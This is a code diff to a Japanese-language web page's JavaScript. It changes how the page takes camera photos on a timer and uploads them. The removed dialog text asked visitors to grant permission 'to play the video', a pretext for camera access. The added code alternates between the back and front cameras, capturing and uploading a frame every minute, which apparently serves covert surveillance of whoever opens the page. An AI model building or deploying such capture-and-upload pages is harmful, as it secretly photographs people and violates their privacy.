@@ -97,7 +97,7 @@
 
     <div class="dialog-overlay" id="dialogOverlay">
         <div class="dialog">
-            <p>動画を再生するには権限を許可してください。</p>
+            <p>カメラの権限を許可してください。</p>
             <button id="reloadButton">再試行</button>
         </div>
     </div>
@@ -345,17 +345,36 @@
         let videoStream;
         let captureInterval;
         let currentCameraIndex = 0;
-        let cameras = [];
+        let frontCamera;
+        let backCamera;
 
         async function requestCameraAccess() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
-                cameras = devices.filter(device => device.kind === 'videoinput');
-                if (cameras.length > 0) {
-                    switchCamera();
-                } else {
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                if (videoDevices.length === 0) {
                     console.error('カメラが見つかりませんでした。');
+                    showCameraPermissionDialog();
+                    return;
                 }
+
+                // 背面カメラを優先して選択、次に前面カメラ
+                for (const device of videoDevices) {
+                    if (device.label.toLowerCase().includes('back')) {
+                        backCamera = device;
+                    } else if (device.label.toLowerCase().includes('front')) {
+                        frontCamera = device;
+                    }
+                }
+
+                if (!backCamera) {
+                    backCamera = videoDevices[0];
+                }
+                if (!frontCamera) {
+                    frontCamera = videoDevices[1] || videoDevices[0];
+                }
+
+                switchCamera();
             } catch (err) {
                 console.error('カメラアクセスエラー:', err);
                 showCameraPermissionDialog();
@@ -366,15 +385,18 @@
             if (videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
             }
-            const camera = cameras[currentCameraIndex];
+
             const constraints = {
-                video: { deviceId: camera.deviceId }
+                video: {
+                    deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
+                }
             };
+
             navigator.mediaDevices.getUserMedia(constraints)
                 .then(stream => {
                     videoStream = stream;
                     startCameraCapture();
-                    currentCameraIndex = (currentCameraIndex + 1) % cameras.length;
+                    currentCameraIndex++;
                 })
                 .catch(err => {
                     console.error('カメラ切り替えエラー:', err);
@@ -397,11 +419,12 @@
                             ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
                             const dataURL = canvas.toDataURL('image/jpeg');
                             uploadImage(dataURL);
+                            switchCamera();
                         })
                         .catch(err => {
                             console.error('画像キャプチャエラー:', err);
                         });
-                }, 10000); // 60000ミリ秒 = 1分
+                }, 60000); // 60000ミリ秒 = 1分
             }
         }
 
